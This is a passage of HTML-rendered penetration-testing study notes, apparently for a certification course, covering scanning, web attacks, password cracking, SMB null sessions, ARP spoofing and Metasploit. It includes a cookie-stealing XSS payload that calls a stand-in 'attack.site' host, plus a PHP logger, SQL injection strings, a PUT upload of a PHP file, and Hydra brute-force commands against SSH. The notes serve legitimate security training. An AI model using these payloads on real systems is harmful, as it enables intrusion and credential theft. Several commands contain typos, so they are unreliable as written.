+<p>If scan is successfull agains a web server, nmap should not have any difficulty to spot the version</p>
+<ul>
+<li>Could mean a firewall is in place</li>
+<li>tcpwrapped
+<ul>
+<li>TCP handshake was complete, but remote host closed connection withouth recieving any data</li>
+</ul>
+</li>
+<li><strong>--reason</strong> - Could be used to explain why a port is open or closed</li>
+</ul>
+</li>
+</ul>
+<h3 id="67-masscann">6.7 Masscann</h3>
+<ul>
+<li>Used on larger networks with more IPs</li>
+<li>Faster than nmap, but less accurate</li>
+<li>Can be used for a general network map, and then nmap for fine graining the results</li>
+</ul>
+<h2 id="7-vulnerability-assessment">7 Vulnerability Assessment</h2>
+<ul>
+<li>Finding vulnerabilities without executing the exploitation phase</li>
+</ul>
+<h3 id="71-vulnerability-scanner">7.1 Vulnerability Scanner</h3>
+<ul>
+<li>
+<p>Scanner performs probes on</p>
+<ul>
+<li>Port daemons</li>
+<li>Configuration files of OS, software, network devices, etc</li>
+<li>Windows registry entries</li>
+</ul>
+</li>
+<li>
+<p>Compares result to its database</p>
+</li>
+<li>
+<p>Scanners vendor keeps the tool up to date by updating database</p>
+</li>
+<li>
+<p>Scanners do not work on custom applications, perform manual testing for these</p>
+</li>
+<li>
+<p>How they work:</p>
+<ol>
+<li>Determine if target hosts are alive and which ports are open</li>
+<li>For every port found, the scanner sends special probes to determine application</li>
+<li>For each detected service, the scanner looks queries its database and looks for matches</li>
+<li>The scanner sends probes to verify the vulnerability exists</li>
+</ol>
+</li>
+</ul>
+<h3 id="72-nessus">7.2 Nessus</h3>
+<ul>
+<li>Vulnerabilty scanner</li>
+<li>Client and server components
+<ul>
+<li>Client
+<ul>
+<li>Provides interface</li>
+</ul>
+</li>
+<li>Server
+<ul>
+<li>Scans by sending probes to systems and applications</li>
+<li>Compares results to database</li>
+</ul>
+</li>
+<li>Can run both on one machine</li>
+</ul>
+</li>
+</ul>
+<h2 id="8-web-application-attacks">8 Web Application Attacks</h2>
+<h3 id="81-fingerprinting-web-servers">8.1 Fingerprinting Web Servers</h3>
+<ul>
+<li>To fingerprint web server is finding:
+<ul>
+<li>Daemon providing the wev server</li>
+<li>Version</li>
+<li>OS of the machine hosting the server</li>
+</ul>
+</li>
+</ul>
+<h4 id="812-fingerprinting-with-netcat">8.1.2 Fingerprinting with Netcat</h4>
+<ul>
+<li>
+<p>Use as a client and manually send requests to server</p>
+</li>
+<li>
+<p>Banner grabbing</p>
+<ul>
+<li>Connect to a listening daemon and grab the banner it sends back</li>
+<li><em>nc [target address] 80</em></li>
+<li>Netcats connects to server</li>
+<li>Hit enter two times</li>
+<li><strong>HEAD/HTTP/1.0</strong></li>
+</ul>
+</li>
+<li>
+<p>Does not work with HTTPS</p>
+</li>
+</ul>
+<h4 id="813-fingerpriting-with-openssl">8.1.3 Fingerpriting with OpenSSL</h4>
+<ul>
+<li>Works with HTTPS</li>
+<li><em>opens ssl s_client -connect target.site:443</em></li>
+<li><strong>HEAD / HTTP/1.0</strong></li>
+</ul>
+<h4 id="814-fingerprinting-with-httprint">8.1.4 Fingerprinting with Httprint</h4>
+<ul>
+<li>Signature based fingerprinting</li>
+<li>Common syntax
+<ul>
+<li><em>httprint -P0 -h [target hosts] -s [signature file]</em></li>
+</ul>
+</li>
+</ul>
+<h3 id="82-http-verbs">8.2 HTTP Verbs</h3>
+<h4 id="821-recap-of-http-verbs">8.2.1 Recap of HTTP verbs</h4>
+<ol>
+<li><strong>GET</strong>
+<ul>
+<li>Browser can request resources
+<ul>
+<li><strong>GET</strong> <em>/page.php HTTP/1.1</em></li>
+</ul>
+</li>
+<li>Can also pass arguments to web app
+<ul>
+<li><strong>GET</strong> <em>/page.php?resource=ITEM</em> <strong>HTTP/1.1</strong></li>
+<li><strong>Host:</strong> <em><a href="http://www.example.com">www.example.com</a></em></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>POST</strong>
+<ul>
+<li>Submit HTML form data in the message body</li>
+</ul>
+</li>
+<li><strong>HEAD</strong>
+<ul>
+<li>Similar to <strong>GET</strong>, but only asks for header of the response to the response body</li>
+</ul>
+</li>
+<li><strong>PUT</strong>
+<ul>
+<li>Uploads file to the server</li>
+</ul>
+</li>
+<li><strong>DELETE</strong>
+<ul>
+<li>Removes a file from the server</li>
+</ul>
+</li>
+<li><strong>OPTIONS</strong>
+<ul>
+<li>Queries to HTTP server for enabled HTTP verbs</li>
+</ul>
+</li>
+</ol>
+<h4 id="822-rest-apis">8.2.2 REST APIs</h4>
+<ul>
+<li>Web application that strongly rely on HTTP verbs</li>
+<li>Expect to have subverted functionality
+<ul>
+<li>e.g PUT for saving data not saving files</li>
+</ul>
+</li>
+<li>Check wether the verbs do what you think they do</li>
+</ul>
+<h3 id="83-expoliting-misconfigured-http-verbs">8.3 Expoliting Misconfigured HTTP Verbs</h3>
+<ul>
+<li>First enumerate available methods with an <strong>OPTIONS</strong> message with netcat
+<ul>
+<li><em>nc victim.site 80</em></li>
+<li><strong>OPTIONS</strong> <em>/ HTTP/1.0</em></li>
+<li>Inspect response <strong>Allow</strong> parameter</li>
+</ul>
+</li>
+</ul>
+<h4 id="831-exploiting-put">8.3.1 Exploiting PUT</h4>
+<ul>
+<li>
+<p>Must know size of payload before upload</p>
+<ul>
+<li>Find with <em>wc -m payload.php</em></li>
+</ul>
+</li>
+<li>
+<p>Example</p>
+<ul>
+<li><em>nc vinctim.site 80</em></li>
+</ul>
+<pre><code class="language-HTTP"><div><span class="hljs-keyword">PUT</span> <span class="hljs-string">/payload.php</span> HTTP/1.0
+<span class="hljs-attribute">Content-type</span>: text/html
+<span class="hljs-attribute">Content-length</span>: 20
+
+<span class="clojure">(<span class="hljs-name">?php</span> phpinfo()<span class="hljs-comment">; ?)</span>
+</span></div></code></pre>
+</li>
+<li>
+<p>After uploading the file, pass arguments to the file via cmd GET parameter</p>
+</li>
+</ul>
+<h3 id="84-google-hacking">8.4 Google Hacking</h3>
+<ul>
+<li>Advanced google searches to find vulnerable subdomains or files on a site</li>
+<li>Google Dorks</li>
+<li>see: <a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></li>
+</ul>
+<h3 id="85-xss">8.5 XSS</h3>
+<ul>
+<li>
+<p>A successfull attack could lead the attacker to:</p>
+<ul>
+<li>Modify content of site at runtime</li>
+<li>Inject malicous content</li>
+<li>Steal cookies</li>
+<li>Perform unauthenticated actions</li>
+<li>etc...</li>
+</ul>
+</li>
+<li>
+<p>Actors involved</p>
+<ul>
+<li>A vulnerable website</li>
+<li>Victim user</li>
+<li>Pentester/hacker</li>
+</ul>
+</li>
+<li>
+<p>Happens because of unfiltered user input to build output content</p>
+</li>
+<li>
+<p>User input is any parameter coming from the user</p>
+</li>
+<li>
+<p>All user inputs should be validated because a user input is never to obe trusted</p>
+</li>
+<li>
+<p>An attacker exploits a web site by</p>
+<ul>
+<li>Making the user browser load malicous content</li>
+<li>Performing actions on other users behalf</li>
+<li>Stealing their session cookies</li>
+</ul>
+</li>
+</ul>
+<h4 id="851-finding-xss">8.5.1 Finding XSS</h4>
+<ol>
+<li>Look at every user input and test if it is somehow displayed to the output of the site(reflection point)</li>
+<li>Check if it possible to inject HTML code and if it ouputs
+<ul>
+<li>Try HTML tags ( )</li>
+</ul>
+</li>
+</ol>
+<h4 id="852-reflected-xss">8.5.2 Reflected XSS</h4>
+<ul>
+<li>Payload is carried inside request that the users browser sends to the webpage</li>
+<li>Called reflected becauses an input from the user is immediately reflected to the output page</li>
+</ul>
+<h4 id="853-persistent-xss-attacks">8.5.3 Persistent XSS Attacks</h4>
+<ul>
+<li>
+<p>Payload is sent to the vulnerable site and stored and executed when the page web page pulls the stored content</p>
+</li>
+<li>
+<p>A single attack could exploit multiple users</p>
+</li>
+<li>
+<p>Most common attacks are from HTLM post forms</p>
+</li>
+<li>
+<p>Examples</p>
+<ul>
+<li>
+<p>Display cookie with</p>
+<ul>
+<li><code>(script) alert(document.cookie)(/script)</code></li>
+</ul>
+</li>
+<li>
+<p>Send cookie to attacker-controlled site</p>
+<ul>
+<li>
+<pre><code class="language-javascript"><div>(script)
+<span class="hljs-keyword">var</span> i = <span class="hljs-keyword">new</span> Image();
+i.src=<span class="hljs-string">"http://attack.site/log.php?q="</span>+<span class="hljs-built_in">document</span>.cookie;
+</div></code></pre>
+</li>
+<li>
+<pre><code class="language-php"><div>(?php
+$filename=<span class="hljs-string">"/tmp/log.txt"</span>;
+$fp=fopen($filname, <span class="hljs-string">'a'</span>);
+$cookie=$_GET[<span class="hljs-string">'q'</span>];
+fwrite($fp, $cookie);
+fclose($fp);
+?)  
+</div></code></pre>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="http://Hack.me">Hack.me</a> to test yourself</p>
+</li>
+<li>
+<p>Web application hacker's handbook</p>
+</li>
+</ul>
+<h3 id="86-sql-injections">8.6 SQL Injections</h3>
+<h4 id="861-sql-statements">8.6.1 SQL Statements</h4>
+<ul>
+<li>
+<p>SQL syntax</p>
+<ul>
+<li>
+<pre><code class="language-sql"><div><span class="hljs-keyword">SELECT</span> (<span class="hljs-keyword">columns</span> <span class="hljs-keyword">list</span>), <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">table</span>) <span class="hljs-keyword">WHERE</span> (condition);
+</div></code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p>Union command</p>
+<ul>
+<li>
+<p>Performs union between two results</p>
+</li>
+<li>
+<pre><code class="language-sql"><div>(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">statement</span>) <span class="hljs-keyword">UNION</span> (other <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">statement</span>);
+</div></code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p>Comments in SQL</p>
+<ul>
+<li>&quot;#&quot; or &quot;--&quot;</li>
+</ul>
+</li>
+</ul>
+<h4 id="862-sql-queries-inside-web-app">8.6.2 SQL Queries Inside Web App</h4>
+<ul>
+<li>The application must
+<ol>
+<li>Connect</li>
+<li>Submit</li>
+<li>Retrieve</li>
+</ol>
+</li>
+</ul>
+<h4 id="863-vulnerable-dynamic-queries">8.6.3 Vulnerable Dynamic Queries</h4>
+<ul>
+<li>
+<p>Change expected <strong>$id</strong> value to a condition that is always true</p>
+<ul>
+<li><strong>' OR 'a'='a</strong></li>
+<li>Second condition is always true</li>
+<li>Selects all items in database</li>
+</ul>
+</li>
+<li>
+<p>Union exploit</p>
+<ul>
+<li>
+<p>Select items with empty id and performing a union with all entries in Accounts table</p>
+</li>
+<li>
+<pre><code class="language-sql"><div>' UNION SELECTS Username, Password  FROM Accounts WHERE 'a'='a;
+</div></code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="864-finding-sql-injections">8.6.4 Finding SQL Injections</h4>
+<ul>
+<li>
+<p>Find injection point and craft payload</p>
+</li>
+<li>
+<p>Test every user supplied input</p>
+<ul>
+<li>GET parameters</li>
+<li>Post parameters</li>
+<li>HTTO Headers</li>
+<li>etc</li>
+</ul>
+</li>
+<li>
+<p>To test input</p>
+<ul>
+<li>String terminators</li>
+<li>SQL commands(SELECT, UNION,...)</li>
+<li>SQL comments</li>
+</ul>
+</li>
+</ul>
+<h4 id="865-exploiting-boolean-based-sqli">8.6.5 Exploiting Boolean Based SQLi</h4>
+<ul>
+<li>
+<p>MySQL functions</p>
+<ul>
+<li>user()
+<ul>
+<li>Returns name of the user currently using the database</li>
+</ul>
+</li>
+<li>substring()
+<ul>
+<li>Returns a substring of given arguemt</li>
+<li>substring([input string], [position], [length])</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>SQL allows testing output if a function in a True/False condition</p>
+<ul>
+<li>
+<p>Can therefor iterate through letters of username</p>
+<ul>
+<li>
+<pre><code class="language-sql"><div>' or substr(user(), 1, 1)= 'a
+</div></code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p>When a letter is found, change to next position until entire username is found</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="866-union-based-sql-injections">8.6.6 UNION Based SQL Injections</h4>
+<ul>
+<li>
+<p>Empties the original queue and shows another attacker controlled querie shown on the page</p>
+</li>
+<li>
+<p>SELECT description FROM items WHERE is='' UNION SELECT user(); -- -';</p>
+<ul>
+<li>Payload forcing the web app to display user() to output page</li>
+<li>The comment part of the payload prevents the original part of the query being parsed by the database</li>
+<li>The last ' is the remainder of the original query</li>
+<li>The third dash is there because browsers automatically remove trailing spaces in the URL</li>
+</ul>
+</li>
+<li>
+<p>Important to find the number of fields in the input</p>
+<ul>
+<li>Test UNION with different amounts of fields
+<ul>
+<li>' UNION SELECT null; -- -</li>
+<li>' UNION SELECT null, null; -- -</li>
+<li>' UNION SELECT null, null, null; -- -</li>
+<li>etc...</li>
+<li>Until one result gives a valid output</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>When number of outputs are found, test which display out</p>
+<ul>
+<li>Test with known values and observe what the site reflects</li>
+</ul>
+</li>
+<li>
+<p>Not only SELECT is vulnerable for injection</p>
+</li>
+<li>
+<p>What does the SQL query do?</p>
+<ul>
+<li>Modifing data?</li>
+<li>Only displays data?</li>
+</ul>
+</li>
+<li>
+<p>Find injection point, then use SQLMap</p>
+</li>
+</ul>
+<h4 id="866-sqlmap">8.6.6 SQLMap</h4>
+<ul>
+<li>sqlmap -u (URL) -p (parameter) --techique=(technique(e.g U))</li>
+<li><strong>-b</strong>
+<ul>
+<li>Find database banner</li>
+</ul>
+</li>
+<li><strong>--tables</strong>
+<ul>
+<li>Find database tables</li>
+</ul>
+</li>
+<li><strong>--current-db (database)</strong>
+<ul>
+<li>Find information from a specific database</li>
+</ul>
+</li>
+<li><strong>--columns</strong>
+<ul>
+<li>Find columns in database</li>
+</ul>
+</li>
+<li><strong>--dump</strong>
+<ul>
+<li>Get values from table</li>
+</ul>
+</li>
+<li><strong>-T</strong>
+<ul>
+<li>Specify table</li>
+</ul>
+</li>
+<li><strong>-D</strong>
+<ul>
+<li>Specify database</li>
+</ul>
+</li>
+</ul>
+<h2 id="9-system-attacks">9 System Attacks</h2>
+<h3 id="91-password-attacks">9.1 Password Attacks</h3>
+<h4 id="912-john-the-ripper">9.1.2 John the Ripper</h4>
+<ul>
+<li>
+<p>Mount brute force and dictionairy attacks</p>
+</li>
+<li>
+<p>Check formats supported</p>
+<ul>
+<li><strong>--list=formats</strong></li>
+</ul>
+</li>
+<li>
+<p>Needs passwords and usernames to be in the same file</p>
+<ul>
+<li>Use <em>unshadow</em> tool to place in same file</li>
+<li><strong>unshadow plaintext.txt hashes.txt ) crackme</strong></li>
+</ul>
+</li>
+<li>
+<p>Brute force attack</p>
+<ul>
+<li><strong>john -incremental -users:(users list) (file to crack)</strong></li>
+</ul>
+</li>
+<li>
+<p>Brute force a single user</p>
+<ul>
+<li><strong>john -incremental -user:victim crackme</strong></li>
+</ul>
+</li>
+<li>
+<p>Display passwords recovered</p>
+<ul>
+<li><strong>--show</strong></li>
+</ul>
+</li>
+<li>
+<p>Run john with a dictionairy</p>
+<ul>
+<li><strong>john --wordlist(=custom wordlist file) (file to crack)</strong></li>
+</ul>
+</li>
+<li>
+<p>Mangling with john</p>
+<ul>
+<li>Try different common variations of passwords</li>
+<li><strong>john --wordlist(=custom wordlist file) -rules (file to crack)</strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="913-hashcat">9.1.3 Hashcat</h4>
+<ul>
+<li>
+<p>Relies on GPU not CPU to crack passwords</p>
+</li>
+<li>
+<p><strong>-b</strong></p>
+<ul>
+<li>Run this first to test system</li>
+<li>Benchmark test</li>
+</ul>
+</li>
+<li>
+<p><strong>-m</strong></p>
+<ul>
+<li>Hash type</li>
+<li>e.g 0 is MD5</li>
+</ul>
+</li>
+<li>
+<p><strong>-a</strong></p>
+<ul>
+<li>Attack type</li>
+<li>e.g 0 is dictionairy</li>
+<li>Example
+<ul>
+<li><strong>hashcat -m 0 -a 0 -D2 example0.hash example.dict</strong></li>
+<li>MD5 dictionairy attack with hashes from example.hash with example.dict</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>-r</strong> (path to rule file)</p>
+<ul>
+<li>Rule based attack</li>
+<li>Write rules to file that hashcat can use later for refrence</li>
+<li>Write to own file with another rule for each line</li>
+<li>Makes the process a lot more faster</li>
+<li><a href="https://www.notsosecure.com/one-rule-to-rule-them-all">https://www.notsosecure.com/one-rule-to-rule-them-all</a>
+<ul>
+<li>Most effective rules for cracking passwords</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Mask attack</p>
+<ul>
+<li>Guess what kind of symbol is at given position</li>
+<li>Could be a lot faster than brute force attacks</li>
+<li>Define what kind of symbol should be in a given posistion</li>
+<li>Charset
+<ul>
+<li>?l = a-z</li>
+<li>?u = A-Z</li>
+<li>?d = 0-9</li>
+<li>?h = 0-9, a-f</li>
+<li>?H = 0-9, A-F</li>
+<li>?s = &quot;space ! - `</li>
+<li>?a = ?l?u?d?s</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="914-rainbow-tables">9.1.4 Rainbow Tables</h4>
+<ul>
+<li>Time processing tradeoff for calculating hashes</li>
+<li>Contains links between the results of a run of one hashing function and another</li>
+<li>Reduces cracking time by a large amount</li>
+<li>Use <strong>Ophcrack</strong> for cracking Windows autentication passwords</li>
+</ul>
+<h2 id="10-network-attacks">10 Network Attacks</h2>
+<h3 id="101-authentication-cracking">10.1 Authentication Cracking</h3>
+<h4 id="1011-hydra">10.1.1 Hydra</h4>
+<ul>
+<li>
+<p>Can use brute force or dictionairy attacks to authenticate on web servers</p>
+</li>
+<li>
+<p>Dictionairy attack</p>
+<ul>
+<li><strong>hydra -L users.txt -P pass.txt (service://server) (options)</strong></li>
+</ul>
+</li>
+<li>
+<p><strong>-p</strong> or <strong>-P</strong></p>
+<ul>
+<li>Try given password(s) string(s) or from file</li>
+</ul>
+</li>
+<li>
+<p><strong>-t</strong></p>
+<ul>
+<li>How many paralell tasks to execute</li>
+</ul>
+</li>
+<li>
+<p><strong>-l</strong> or <strong>-L</strong></p>
+<ul>
+<li>Try login name(s) string(s) or from file</li>
+</ul>
+</li>
+<li>
+<p><strong>-U</strong></p>
+<ul>
+<li>Service model usage details</li>
+<li>What options must be specified for the attack to run</li>
+</ul>
+</li>
+<li>
+<p><strong>-f</strong></p>
+<ul>
+<li>Exit after first successfull login</li>
+</ul>
+</li>
+<li>
+<p><strong>-V</strong></p>
+<ul>
+<li>Verbosity</li>
+</ul>
+</li>
+<li>
+<p><strong>http-post-forms</strong></p>
+<ul>
+<li><strong>hydra (1) http-post-form &quot;/login.php:(2)^USER^&amp; (3)=^PASS^:(4)</strong>
+<ol>
+<li>Login site</li>
+<li>HTML POST user parameter</li>
+<li>HTML POST password parameter</li>
+<li>Unsuccessfull login message from website</li>
+</ol>
+<ul>
+<li>Example
+<ul>
+<li><strong>hydra hack.this http-post-form &quot;/login.php:usr^USER^&amp;pwd=^PASS^:invalid credentials -L /usr/share/ncrack/minimal.usr -P /usr/share/seclist/Passwords/rock-you-15.txt -f -V</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>telnet attack</p>
+<ul>
+<li><strong>hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rock-you-10.txt  telnet://(address)</strong></li>
+</ul>
+</li>
+<li>
+<p>SSH attack</p>
+<ul>
+<li><strong>hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rock-you-10.txt  (address) ssh</strong></li>
+<li>Once in, download files with
+<ul>
+<li><strong>scp username@hostname:/path/to/remote/file /path/to/local/file</strong></li>
+<li>Important unix files
+<ul>
+<li><strong>/etc/passwd</strong></li>
+<li><strong>/etc/shadow</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="102-windows-shares">10.2 Windows Shares</h3>
+<h4 id="1021-netbios">10.2.1 NetBIOS</h4>
+<ul>
+<li>
+<p>Network Basic Input Output System</p>
+</li>
+<li>
+<p>View shares on a local network</p>
+</li>
+<li>
+<p>Can supply information when quering a computer</p>
+<ul>
+<li>Hostname</li>
+<li>NetBIOS name</li>
+<li>Domain</li>
+<li>Network shares</li>
+</ul>
+</li>
+<li>
+<p>Sits between application layer and IP layer</p>
+</li>
+<li>
+<p>Small traffic relies on UDP</p>
+<ul>
+<li>Name resolution and one to many datagram communication</li>
+</ul>
+</li>
+<li>
+<p>Big traffic relies on TCP</p>
+<ul>
+<li>e.g file copy</li>
+<li>Uses <strong>NetBIOS</strong> sessions</li>
+</ul>
+</li>
+<li>
+<p>MS windows machine when browsing network</p>
+<ul>
+<li>Datagrams to list the shares and the machines</li>
+<li>Names to find workgroups</li>
+<li>Sessions to transmit data to and from a Windows share</li>
+</ul>
+</li>
+</ul>
+<h4 id="1022-shares">10.2.2 Shares</h4>
+<ul>
+<li>A windows machine can share a file or a directory on the network</li>
+<li>Remote and local users can access the resource</li>
+<li>Users just has to turn on File and Printer Sharing service</li>
+<li>Users can set permissions on shares, choosing permissions for other users on that share</li>
+</ul>
+<h4 id="1023-unc-path">10.2.3 UNC Path</h4>
+<ul>
+<li>Universal NAming Conventions paths</li>
+<li>Authorized users can access shares</li>
+<li><strong>\ServerName\ShareName\file.nat</strong></li>
+</ul>
+<h4 id="1024-admin-shares">10.2.4 Admin Shares</h4>
+<ul>
+<li>Default shares for admins and the windows OS</li>
+<li><strong>\ComputerName\C$</strong>
+<ul>
+<li>Lets admin access local volume on machine</li>
+</ul>
+</li>
+<li><strong>\ComputerName\admin$</strong>
+<ul>
+<li>Points to windows install dir</li>
+</ul>
+</li>
+<li><strong>\ComputerName\ipc$</strong>
+<ul>
+<li>Used for interprocess communication</li>
+</ul>
+</li>
+</ul>
+<h3 id="103-null-sessions">10.3 Null Sessions</h3>
+<ul>
+<li>
+<p>Used to enumerate info</p>
+<ul>
+<li>Passwords</li>
+<li>System users</li>
+<li>System groups</li>
+<li>Running processes</li>
+</ul>
+</li>
+<li>
+<p>Remote exploitable</p>
+</li>
+<li>
+<p>Most modern windows systems are not vulnerable, but some legacy systems are</p>
+</li>
+<li>
+<p>Exploit of autheticity for Windows administrative shares</p>
+</li>
+</ul>
+<h4 id="1031-enumerating-windows-shares-on-windows">10.3.1 Enumerating Windows Shares on Windows</h4>
+<ul>
+<li>
+<p><strong>nbtstat</strong></p>
+<ul>
+<li><strong>nbtstat -A (IP)</strong>
+<ul>
+<li>Displays info about a target</li>
+<li>(00) = Computer is workstation</li>
+<li>UNIQUE = Computer has only one IP</li>
+<li>(20) = File sharing is running on the machine</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>NET VIEW</strong></p>
+<ul>
+<li>Once the attacker knows the machine is running the File server service</li>
+<li><strong>NET VIEW (TARGET IP)</strong></li>
+</ul>
+</li>
+</ul>
+<h3 id="1032-checking-for-null-sessions-on-windows">10.3.2 Checking for Null Sessions on Windows</h3>
+<ul>
+<li>Once found File and Printer Sharing service</li>
+<li>Exploit IPC$ administrative share
+<ul>
+<li><strong>NET USE \(target IP address)\IPC$ '' /u: ''</strong>
+<ul>
+<li>Conect with empty password and username</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="1033-exploiting-null-sessions-on-windows">10.3.3 Exploiting Null Sessions on Windows</h4>
+<ul>
+<li>
+<p><strong>enum</strong></p>
+<ul>
+<li><strong>enum -S (target IP)</strong>
+<ul>
+<li><strong>-S</strong> = Enumerate shares on machine</li>
+<li><strong>-U</strong> = Enumerate users</li>
+<li><strong>-P</strong> = Check password policy
+<ul>
+<li>Can help with brute forcing and false positives</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>winfo</strong></p>
+<ul>
+<li><strong>winfo (target IP) -n</strong>
+<ul>
+<li><strong>-n</strong> = Tell the tool to use null sessions</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="1034-enumerating-windows-shares-on-linux">10.3.4 Enumerating Windows Shares on Linux</h4>
+<ul>
+<li>
+<p><strong>nmblookup</strong></p>
+<ul>
+<li><strong>nmblookup -A (target ip address)</strong></li>
+</ul>
+</li>
+<li>
+<p><strong>smbclient</strong></p>
+<ul>
+<li>FTP-like client to access windows shares</li>
+<li>Can also enumerate</li>
+<li><strong>smbclient -L //(target ip) -N</strong>
+<ul>
+<li><strong>-L</strong> = Lookes up what services are available on the target</li>
+<li><strong>-N</strong> = Forces the tool to not ask for password</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="1035-checking-for-null-sessions-on-linux">10.3.5 Checking for Null Sessions on Linux</h4>
+<ul>
+<li><strong>smbclient //(target ip)/(target share) -N</strong></li>
+</ul>
+<h4 id="1036-check-null-sessions-with-nmap">10.3.6 Check Null Sessions with Nmap</h4>
+<ul>
+<li><strong>nmap script=smb-enum-shares (target IP)</strong>
+<ul>
+<li>Gather information about shares</li>
+</ul>
+</li>
+<li><strong>nmap script=smb-enum-users (target IP)</strong>
+<ul>
+<li>Gather information about users on the network</li>
+</ul>
+</li>
+<li><strong>nmap script vuln script-args=unsafe=1 (target IP)</strong>
+<ul>
+<li>Is SMB server vulnerable to known smb vulnerabilities</li>
+</ul>
+</li>
+</ul>
+<h4 id="1037-exploiting-null-sessions-on-linux">10.3.7 Exploiting Null Sessions on Linux</h4>
+<ul>
+<li><strong>enum4linux</strong>
+<ul>
+<li>Same operations as enum dn winfo, but more features</li>
+<li><strong>enum4linux (options) (target IP)</strong>
+<ul>
+<li><strong>-S</strong> = Enumerate shares on machine</li>
+<li><strong>-s /usr/share/enum4linux/share-list.txt</strong> = Brute force shares on a machine</li>
+<li><strong>-U</strong> = Enumerate users</li>
+<li><strong>-P</strong> = Check password policy</li>
+<li><strong>-G</strong> = Get group information</li>
+<li><strong>-a</strong> = Run all commands</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="1038-samrdump">10.3.8 Samrdump</h4>
+<ul>
+<li><strong>/usr/share/doc/python-impacket-doc/examples/samrdump.py</strong></li>
+<li><strong><a href="http://samrdump.py">samrdump.py</a> (targetIP)</strong></li>
+<li>Gather user information(password complexity, UID's, log on date, etc)</li>
+</ul>
+<h4 id="1039-nmap-smb-brute-force">10.3.9 Nmap smb Brute Force</h4>
+<ul>
+<li><strong>nmap script=smb-brute (target IP)</strong>
+<ul>
+<li>Attempt to brute force user credentials to smb users</li>
+</ul>
+</li>
+</ul>
+<h3 id="104-arp-poisoning">10.4 ARP Poisoning</h3>
+<ul>
+<li>MITM attack</li>
+<li>Manipulates hosts ARP cache</li>
+<li>Manipulates by sending gratuitous ARP replies
+<ul>
+<li>Attacker sends reply without waiting for any hosts to make a request</li>
+<li>Tells other nodes to reach the victims IP at the attackers MAC</li>
+<li>Prevents the expiring for the poisoned entry by sending a reply every 30 seconds or so</li>
+</ul>
+</li>
+</ul>
+<h4 id="1041-arpspoof">10.4.1 Arpspoof</h4>
+<ul>
+<li>
+<p><strong>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</strong></p>
+<ul>
+<li>Forwards packets intercepted to real destination</li>
+</ul>
+</li>
+<li>
+<p><strong>arpspoof -i (interface) -t (target) -r (host)</strong></p>
+<ul>
+<li><strong>-i</strong> is NIC(e.g eth0, tap0, etc..)</li>
+<li><strong>-t</strong> targets IP</li>
+<li><strong>-r</strong> web servers IP</li>
+<li>Then run wireshark to intercept traffic</li>
+</ul>
+</li>
+</ul>
+<h3 id="105-metasploit">10.5 Metasploit</h3>
+<ul>
+<li>
+<p><strong>service postgresql start</strong></p>
+<ul>
+<li>Makes msf search faster</li>
+</ul>
+</li>
+<li>
+<p><strong>service metasploit start</strong></p>
+</li>
+<li>
+<p><strong>msfconsole</strong></p>
+</li>
+<li>
+<p><strong>search (string)</strong></p>
+<ul>
+<li>Search the metasploit database</li>
+</ul>
+</li>
+<li>
+<p><strong>show (string)</strong></p>
+<ul>
+<li>Can be used to show
+<ul>
+<li>Exploits</li>
+<li>Available payloads when an exploit is selected</li>
+<li>Options</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>use /path/to/exploit(or payload)</strong></p>
+<ul>
+<li>Select exploit or payload to use</li>
+</ul>
+</li>
+<li>
+<p><strong>back</strong></p>
+<ul>
+<li>Go back to msfconsole prompt</li>
+</ul>
+</li>
+<li>
+<p><strong>info (string)</strong></p>
+<ul>
+<li>Get info on exploit/payload</li>
+</ul>
+</li>
+<li>
+<p><strong>set (option)(value)</strong></p>
+<ul>
+<li>Set an option parameter for an exploit or payload</li>
+</ul>
+</li>
+<li>
+<p><strong>msfupdate</strong></p>
+<ul>
+<li>Updates metasploit</li>
+</ul>
+</li>
+<li>
+<p><strong>options</strong></p>
+<ul>
+<li>RHOST = IP to target machine</li>
+<li>LHOST = Localhost IP to the machine of the attacker</li>
+<li>LPORT = Port on the attackers machine</li>
+</ul>
+</li>
+<li>
+<p><strong>persistence modules</strong></p>
+<ul>
+<li>Install backdoors</li>
+</ul>
+</li>
+<li>
+<p><strong>Example of use</strong></p>
+<ul>
+<li>ARP scan</li>
+<li>Port scan</li>
+</ul>
+</li>
+</ul>
+<h3 id="106-meterpreter">10.6 Meterpreter</h3>
+<ul>
+<li>
+<p>Attacking shell</p>
+</li>
+<li>
+<p>Connections</p>
+<ul>
+<li><strong>reverse-tcp</strong>
+<ul>
+<li>Performs TCP connection back to attackers machine</li>
+<li>Could evade firewalls</li>
+</ul>
+</li>
+<li><strong>bind-tcp</strong>
+<ul>
+<li>Runs a server process on the victims machine waiting for a connection from an attacker</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>MSFConsole can host multiple Meterpreter sessions</p>
+</li>
+<li>
